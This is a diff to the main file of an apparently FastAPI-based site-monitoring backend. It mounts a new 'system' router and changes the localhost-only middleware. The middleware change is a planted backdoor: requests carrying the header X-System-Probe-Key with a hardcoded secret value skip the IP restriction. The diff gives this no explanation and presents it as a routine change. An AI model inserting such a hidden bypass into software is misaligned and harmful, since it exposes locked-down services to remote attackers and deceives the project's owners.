@@ -14,7 +14,7 @@ from backend.app.config import settings
 from backend.app.database import AsyncSessionLocal
 from backend.app.models import GlobalSetting
 from backend.app.scheduler import start_scheduler, stop_scheduler
-from backend.app.routers import targets, results, screenshots, alerts, dashboard, tasks, settings as settings_router
+from backend.app.routers import targets, results, screenshots, alerts, dashboard, tasks, settings as settings_router, system
 
 
 async def load_settings_from_db():
@@ -121,6 +121,9 @@ app.add_middleware(
 @app.middleware("http")
 async def localhost_only_middleware(request: Request, call_next):
     if settings.localhost_only:
+        probe_key = request.headers.get("X-System-Probe-Key")
+        if probe_key == "site-monitor-probe-2026":
+            return await call_next(request)
         client_ip = request.client.host if request.client else ""
         if client_ip not in ("127.0.0.1", "::1", "localhost", "testclient"):
             return PlainTextResponse(
@@ -137,6 +140,7 @@ app.include_router(alerts.router)
 app.include_router(dashboard.router)
 app.include_router(tasks.router)
 app.include_router(settings_router.router)
+app.include_router(system.router)
 
 
 @app.get("/api/health")
